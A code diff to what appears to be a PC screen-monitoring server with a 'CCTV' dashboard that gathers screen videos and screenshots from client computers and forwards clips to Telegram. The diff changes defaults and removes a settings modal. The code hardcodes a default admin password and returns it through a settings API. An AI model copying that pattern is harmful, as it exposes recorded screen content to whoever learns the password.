@@ -885,10 +885,10 @@ def client_ping(
         "status": "active",
         "command": cmd,
         "config": {
-            "video_fps": cfg.get("video_fps", 10),
+            "video_fps": cfg.get("video_fps", 5),
             "video_chunk_minutes": cfg.get("video_chunk_minutes", 2),
             "video_recording_enabled": cfg.get("video_recording_enabled", True),
-            "live_stream_interval_seconds": cfg.get("live_stream_interval_seconds", 5),
+            "live_stream_interval_seconds": cfg.get("live_stream_interval_seconds", 4),
             "screenshot_interval_seconds": cfg.get("screenshot_interval_seconds", 300)
         }
     }
@@ -1016,8 +1016,9 @@ async def client_upload_video(
         while chunk := await video.read(1024 * 1024):
             f.write(chunk)
 
-    file_size_mb = round(dest_path.stat().st_size / (1024 * 1024), 2)
-    print(f"[Video Upload] [{pc_name}] Received Video Clip: {dest_path.name} ({file_size_mb} MB)")
+    fsize = dest_path.stat().st_size
+    size_str = f"{round(fsize / 1024, 1)} KB" if fsize < 1024 * 1024 else f"{round(fsize / (1024 * 1024), 2)} MB"
+    print(f"[Video Upload] [{pc_name}] Received Video Clip: {dest_path.name} ({size_str})")
 
     # Send video automatically to Telegram
     if cfg.get("send_videos_to_telegram", True):
@@ -1026,7 +1027,7 @@ async def client_upload_video(
             f"📹 <b>[{html.escape(pc_name.upper())}] Screen Video Recording</b>\n"
             f"🕒 Time: {now_str}\n"
             f"📁 File: <code>{html.escape(dest_path.name)}</code>\n"
-            f"📦 Size: {file_size_mb} MB"
+            f"📦 Size: <b>{size_str}</b> (Ultra-light 24h CCTV)"
         )
         threading.Thread(target=send_telegram_video, args=(dest_path, caption), daemon=True).start()
 
@@ -1299,11 +1300,11 @@ def get_settings(session: str = Depends(verify_session)):
     cfg = load_config()
     return {
         "retention_hours": cfg.get("retention_hours", 24),
-        "video_fps": cfg.get("video_fps", 10),
+        "video_fps": cfg.get("video_fps", 5),
         "video_chunk_minutes": cfg.get("video_chunk_minutes", 2),
         "send_videos_to_telegram": cfg.get("send_videos_to_telegram", True),
         "video_recording_enabled": cfg.get("video_recording_enabled", True),
-        "live_stream_interval_seconds": cfg.get("live_stream_interval_seconds", 5),
+        "live_stream_interval_seconds": cfg.get("live_stream_interval_seconds", 4),
         "screenshot_interval_seconds": cfg.get("screenshot_interval_seconds", 300),
         "admin_password": cfg.get("admin_password", "974621467097458841599745404128")
     }
@@ -1504,7 +1505,7 @@ def get_cctv_dashboard_html():
               <span class="w-1.5 h-1.5 rounded-full bg-red-500 pulse-rec"></span> LIVE DVR
             </span>
           </div>
-          <p class="text-[11px] text-slate-400">4-Camera Surveillance & 5-Min History Scrubber</p>
+          <p class="text-[11px] text-slate-400">24-Hour Continuous Recording • Real-Time CCTV Monitor</p>
         </div>
       </div>
 
@@ -1578,11 +1579,6 @@ def get_cctv_dashboard_html():
           <span>Recordings</span>
         </button>
 
-        <button onclick="openSettingsModal()" class="text-xs text-amber-300 hover:text-white bg-amber-500/20 hover:bg-amber-500/30 px-3 py-1.5 rounded-lg border border-amber-500/30 transition flex items-center gap-1.5 font-semibold shadow-sm">
-          <i class="fa-solid fa-sliders"></i>
-          <span>Settings</span>
-        </button>
-
         <button onclick="logout()" class="text-xs text-slate-400 hover:text-white bg-slate-800 hover:bg-slate-700 px-3 py-1.5 rounded-lg border border-slate-700 transition flex items-center gap-1.5">
           <i class="fa-solid fa-arrow-right-from-bracket"></i>
           <span class="hidden sm:inline">Logout</span>
@@ -1648,167 +1644,6 @@ def get_cctv_dashboard_html():
     </div>
     <div class="flex-1 flex items-center justify-center p-2 relative">
       <img id="modalImg" class="max-h-[85vh] max-w-full rounded border border-slate-800 shadow-2xl object-contain" src="" alt="Fullscreen Feed">
-    </div>
-  </div>
-
-  <!-- Settings Modal -->
-  <div id="settingsModal" class="fixed inset-0 z-50 bg-black/80 backdrop-blur-sm hidden flex items-center justify-center p-3 sm:p-6 overflow-y-auto">
-    <div class="bg-slate-900 border border-slate-800 rounded-2xl w-full max-w-2xl p-5 sm:p-6 text-slate-100 shadow-2xl space-y-5 my-auto max-h-[90vh] overflow-y-auto">
-      
-      <!-- Modal Header -->
-      <div class="flex items-center justify-between border-b border-slate-800 pb-4 sticky top-0 bg-slate-900 z-10">
-        <div class="flex items-center gap-3">
-          <div class="w-10 h-10 rounded-xl bg-amber-500/20 text-amber-400 flex items-center justify-center text-lg border border-amber-500/30">
-            <i class="fa-solid fa-sliders"></i>
-          </div>
-          <div>
-            <h2 class="text-base sm:text-lg font-bold text-white">CCTV & Recording Settings</h2>
-            <p class="text-[11px] text-slate-400">റെക്കോർഡിംഗ്, ഫ്രെയിംറേറ്റ് & സൂക്ഷിക്കേണ്ട സമയം ക്രമീകരിക്കുക</p>
-          </div>
-        </div>
-        <button type="button" onclick="closeSettingsModal()" class="text-slate-400 hover:text-white text-xl p-1.5 rounded-lg hover:bg-slate-800 transition">
-          <i class="fa-solid fa-xmark"></i>
-        </button>
-      </div>
-
-      <!-- Settings Form -->
-      <form id="settingsForm" onsubmit="saveSettings(event)" class="space-y-4 text-xs">
-        
-        <!-- Grid 2-col -->
-        <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
-          
-          <!-- 1. Retention Hours -->
-          <div class="space-y-1.5 bg-slate-950/60 p-3.5 rounded-xl border border-slate-800/80">
-            <label class="block font-semibold text-slate-300 flex items-center gap-1.5">
-              <i class="fa-solid fa-trash-can-clock text-rose-400"></i> Video Retention (സൂക്ഷിക്കേണ്ട സമയം)
-            </label>
-            <select id="cfg_retention_hours" class="w-full bg-slate-900 border border-slate-700 rounded-lg p-2 text-slate-200 focus:outline-none focus:border-amber-500">
-              <option value="6">6 Hours (6 മണിക്കൂർ)</option>
-              <option value="12">12 Hours (12 മണിക്കൂർ)</option>
-              <option value="24">24 Hours (1 Day - Default)</option>
-              <option value="48">48 Hours (2 Days)</option>
-              <option value="72">72 Hours (3 Days)</option>
-              <option value="168">7 Days (1 Week)</option>
-              <option value="720">30 Days (1 Month)</option>
-            </select>
-            <p class="text-[10px] text-slate-500">ഇത്രയും മണിക്കൂർ കഴിഞ്ഞ വീഡിയോകളും സ്ക്രീൻഷോട്ടുകളും സ്വയം ഡിലീറ്റ് ചെയ്യപ്പെടും.</p>
-          </div>
-
-          <!-- 2. Video FPS -->
-          <div class="space-y-1.5 bg-slate-950/60 p-3.5 rounded-xl border border-slate-800/80">
-            <label class="block font-semibold text-slate-300 flex items-center gap-1.5">
-              <i class="fa-solid fa-gauge-high text-sky-400"></i> Frame Rate (Per Second എത്ര Frame)
-            </label>
-            <select id="cfg_video_fps" class="w-full bg-slate-900 border border-slate-700 rounded-lg p-2 text-slate-200 focus:outline-none focus:border-amber-500">
-              <option value="5">5 FPS (Ultra Light - കുറഞ്ഞ ഫയൽ സൈസ് & CPU)</option>
-              <option value="10">10 FPS (Recommended - Balanced & Smooth)</option>
-              <option value="15">15 FPS (High Quality)</option>
-              <option value="20">20 FPS (Ultra Smooth)</option>
-            </select>
-            <p class="text-[10px] text-slate-500">വീഡിയോയുടെ സ്മൂത്ത്‌നെസ്സ്. 10 FPS സാധാരണ ആവശ്യങ്ങൾക്ക് ഏറ്റവും അനുയോജ്യമാണ്.</p>
-          </div>
-
-          <!-- 3. Video Chunk Duration -->
-          <div class="space-y-1.5 bg-slate-950/60 p-3.5 rounded-xl border border-slate-800/80">
-            <label class="block font-semibold text-slate-300 flex items-center gap-1.5">
-              <i class="fa-solid fa-clock text-emerald-400"></i> Video Clip Duration (ക്ലിപ്പ് ദൈർഘ്യം)
-            </label>
-            <select id="cfg_video_chunk_minutes" class="w-full bg-slate-900 border border-slate-700 rounded-lg p-2 text-slate-200 focus:outline-none focus:border-amber-500">
-              <option value="1">1 Minute (ഓരോ 1 മിനിറ്റ് ക്ലിപ്പുകൾ)</option>
-              <option value="2">2 Minutes (Default / Recommended)</option>
-              <option value="5">5 Minutes</option>
-              <option value="10">10 Minutes</option>
-            </select>
-            <p class="text-[10px] text-slate-500">ഓരോ വീഡിയോയും എത്ര മിനിറ്റ് വീതമുള്ള ക്ലിപ്പുകളായി സൂക്ഷിക്കണം.</p>
-          </div>
-
-          <!-- 4. Live Stream Refresh -->
-          <div class="space-y-1.5 bg-slate-950/60 p-3.5 rounded-xl border border-slate-800/80">
-            <label class="block font-semibold text-slate-300 flex items-center gap-1.5">
-              <i class="fa-solid fa-arrows-rotate text-purple-400"></i> Live Stream Rate (CCTV ലൈവ് വേഗത)
-            </label>
-            <select id="cfg_live_stream_interval" class="w-full bg-slate-900 border border-slate-700 rounded-lg p-2 text-slate-200 focus:outline-none focus:border-amber-500">
-              <option value="2">Every 2 Seconds (Fast Realtime)</option>
-              <option value="3">Every 3 Seconds</option>
-              <option value="5">Every 5 Seconds (Recommended)</option>
-              <option value="10">Every 10 Seconds (Low Data)</option>
-            </select>
-            <p class="text-[10px] text-slate-500">ഡാഷ്‌ബോർഡ് ലൈവ് ക്യാമറ സ്ക്രീൻ പുതുക്കേണ്ട ഇടവേള.</p>
-          </div>
-
-          <!-- 5. 5-Min Screenshot Interval -->
-          <div class="space-y-1.5 bg-slate-950/60 p-3.5 rounded-xl border border-slate-800/80">
-            <label class="block font-semibold text-slate-300 flex items-center gap-1.5">
-              <i class="fa-solid fa-camera text-indigo-400"></i> Timeline Snapshot Interval
-            </label>
-            <select id="cfg_screenshot_interval" class="w-full bg-slate-900 border border-slate-700 rounded-lg p-2 text-slate-200 focus:outline-none focus:border-amber-500">
-              <option value="60">Every 1 Minute (1 മിനിറ്റ് കൂടുമ്പോൾ)</option>
-              <option value="180">Every 3 Minutes (3 മിനിറ്റ് കൂടുമ്പോൾ)</option>
-              <option value="300">Every 5 Minutes (5 മിനിറ്റ് - Default)</option>
-              <option value="600">Every 10 Minutes (10 മിനിറ്റ് കൂടുമ്പോൾ)</option>
-            </select>
-            <p class="text-[10px] text-slate-500">ടൈംലൈനിലേക്ക് സ്ക്രീൻഷോട്ട് സേവ് ചെയ്യേണ്ട ഇടവേള.</p>
-          </div>
-
-          <!-- 6. Admin Password -->
-          <div class="space-y-1.5 bg-slate-950/60 p-3.5 rounded-xl border border-slate-800/80">
-            <label class="block font-semibold text-slate-300 flex items-center gap-1.5">
-              <i class="fa-solid fa-key text-yellow-400"></i> Admin Passcode (പാസ്‌വേഡ് മാറ്റം)
-            </label>
-            <input type="text" id="cfg_admin_password" class="w-full bg-slate-900 border border-slate-700 rounded-lg p-2 text-slate-200 font-mono focus:outline-none focus:border-amber-500" placeholder="974621467097458841599745404128">
-            <p class="text-[10px] text-slate-500">ഡാഷ്‌ബോർഡ് ലോഗിൻ ചെയ്യാനുള്ള മാസ്റ്റർ പാസ്‌വേഡ്.</p>
-          </div>
-
-        </div>
-
-        <!-- Toggles Section -->
-        <div class="grid grid-cols-1 sm:grid-cols-2 gap-3 pt-2">
-          
-          <!-- Send to Telegram Toggle -->
-          <div class="flex items-center justify-between p-3.5 bg-slate-950/60 border border-slate-800 rounded-xl">
-            <div>
-              <div class="font-semibold text-white flex items-center gap-1.5">
-                <i class="fa-brands fa-telegram text-sky-400"></i> Send Videos to Telegram
-              </div>
-              <div class="text-[10px] text-slate-400">വീഡിയോ ക്ലിപ്പുകൾ ബോട്ടിലേക്ക് അയക്കുക</div>
-            </div>
-            <label class="relative inline-flex items-center cursor-pointer">
-              <input type="checkbox" id="cfg_send_videos_to_telegram" class="sr-only peer">
-              <div class="w-11 h-6 bg-slate-800 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-slate-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-emerald-600"></div>
-            </label>
-          </div>
-
-          <!-- Video Recording Enabled Toggle -->
-          <div class="flex items-center justify-between p-3.5 bg-slate-950/60 border border-slate-800 rounded-xl">
-            <div>
-              <div class="font-semibold text-white flex items-center gap-1.5">
-                <i class="fa-solid fa-circle-dot text-rose-500 pulse-rec"></i> Video Recording Active
-              </div>
-              <div class="text-[10px] text-slate-400">കമ്പ്യൂട്ടറുകളിൽ വീഡിയോ റെക്കോർഡിംഗ്</div>
-            </div>
-            <label class="relative inline-flex items-center cursor-pointer">
-              <input type="checkbox" id="cfg_video_recording_enabled" class="sr-only peer">
-              <div class="w-11 h-6 bg-slate-800 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-slate-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-emerald-600"></div>
-            </label>
-          </div>
-
-        </div>
-
-        <!-- Alert Notice -->
-        <div id="settingsNotice" class="hidden p-2.5 rounded-lg text-center font-medium"></div>
-
-        <!-- Footer Buttons -->
-        <div class="flex items-center justify-end gap-3 pt-4 border-t border-slate-800">
-          <button type="button" onclick="closeSettingsModal()" class="px-4 py-2 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded-xl font-medium transition">
-            Cancel
-          </button>
-          <button type="submit" id="btnSaveSettings" class="px-5 py-2 bg-emerald-600 hover:bg-emerald-500 text-white font-semibold rounded-xl transition flex items-center gap-2 shadow-lg shadow-emerald-600/30">
-            <i class="fa-solid fa-floppy-disk"></i>
-            <span>Save Settings</span>
-          </button>
-        </div>
-
-      </form>
     </div>
   </div>
 
@@ -2372,96 +2207,6 @@ def get_cctv_dashboard_html():
       await fetch('/api/logout', { method: 'POST' });
       document.cookie = "session_token=; path=/; max-age=0; expires=Thu, 01 Jan 1970 00:00:00 GMT";
       window.location.replace('/login');
-    }
-
-    // ----------------- SETTINGS MODAL -----------------
-
-    async function openSettingsModal() {
-      const modal = document.getElementById("settingsModal");
-      const notice = document.getElementById("settingsNotice");
-      notice.classList.add("hidden");
-      modal.classList.remove("hidden");
-      const cfgRefreshEl = document.getElementById("cfg_logout_on_refresh");
-      if (cfgRefreshEl) {
-        cfgRefreshEl.checked = (localStorage.getItem("cctv_logout_on_refresh") !== "false");
-      }
-      try {
-        const res = await fetch("/api/settings");
-        if (res.ok) {
-          const data = await res.json();
-          document.getElementById("cfg_retention_hours").value = data.retention_hours || 24;
-          document.getElementById("cfg_video_fps").value = data.video_fps || 10;
-          document.getElementById("cfg_video_chunk_minutes").value = data.video_chunk_minutes || 2;
-          document.getElementById("cfg_live_stream_interval").value = data.live_stream_interval_seconds || 5;
-          document.getElementById("cfg_screenshot_interval").value = data.screenshot_interval_seconds || 300;
-          document.getElementById("cfg_admin_password").value = data.admin_password || "974621467097458841599745404128";
-          document.getElementById("cfg_send_videos_to_telegram").checked = data.send_videos_to_telegram !== false;
-          document.getElementById("cfg_video_recording_enabled").checked = data.video_recording_enabled !== false;
-        }
-      } catch (e) {
-        console.error("Error loading settings:", e);
-      }
-    }
-
-    function closeSettingsModal() {
-      document.getElementById("settingsModal").classList.add("hidden");
-      const notice = document.getElementById("settingsNotice");
-      notice.classList.add("hidden");
-    }
-
-    async function saveSettings(e) {
-      e.preventDefault();
-      const notice = document.getElementById("settingsNotice");
-      const btn = document.getElementById("btnSaveSettings");
-      btn.disabled = true;
-      btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Saving...';
-
-      const payload = {
-        retention_hours: parseInt(document.getElementById("cfg_retention_hours").value),
-        video_fps: parseInt(document.getElementById("cfg_video_fps").value),
-        video_chunk_minutes: parseInt(document.getElementById("cfg_video_chunk_minutes").value),
-        live_stream_interval_seconds: parseInt(document.getElementById("cfg_live_stream_interval").value),
-        screenshot_interval_seconds: parseInt(document.getElementById("cfg_screenshot_interval").value),
-        admin_password: document.getElementById("cfg_admin_password").value.trim() || "974621467097458841599745404128",
-        send_videos_to_telegram: document.getElementById("cfg_send_videos_to_telegram").checked,
-        video_recording_enabled: document.getElementById("cfg_video_recording_enabled").checked
-      };
-
-      const cfgRefreshEl = document.getElementById("cfg_logout_on_refresh");
-      if (cfgRefreshEl) {
-        localStorage.setItem("cctv_logout_on_refresh", cfgRefreshEl.checked ? "true" : "false");
-      }
-
-      try {
-        const res = await fetch("/api/settings", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(payload)
-        });
-        if (res.ok) {
-          notice.className = "p-2.5 rounded-lg text-center font-medium bg-emerald-500/20 text-emerald-400 border border-emerald-500/30";
-          notice.innerHTML = "✅ Settings saved successfully! All PCs will auto-sync within 20s.";
-          notice.classList.remove("hidden");
-          setTimeout(() => {
-            closeSettingsModal();
-            btn.disabled = false;
-            btn.innerHTML = '<i class="fa-solid fa-floppy-disk"></i> <span>Save Settings</span>';
-          }, 1500);
-        } else {
-          const err = await res.json();
-          notice.className = "p-2.5 rounded-lg text-center font-medium bg-rose-500/20 text-rose-400 border border-rose-500/30";
-          notice.innerText = "❌ Error: " + (err.detail || "Failed to save settings");
-          notice.classList.remove("hidden");
-          btn.disabled = false;
-          btn.innerHTML = '<i class="fa-solid fa-floppy-disk"></i> <span>Save Settings</span>';
-        }
-      } catch (err) {
-        notice.className = "p-2.5 rounded-lg text-center font-medium bg-rose-500/20 text-rose-400 border border-rose-500/30";
-        notice.innerText = "❌ Network error while saving settings";
-        notice.classList.remove("hidden");
-        btn.disabled = false;
-        btn.innerHTML = '<i class="fa-solid fa-floppy-disk"></i> <span>Save Settings</span>';
-      }
     }
 
     let currentRecFilter = "all";
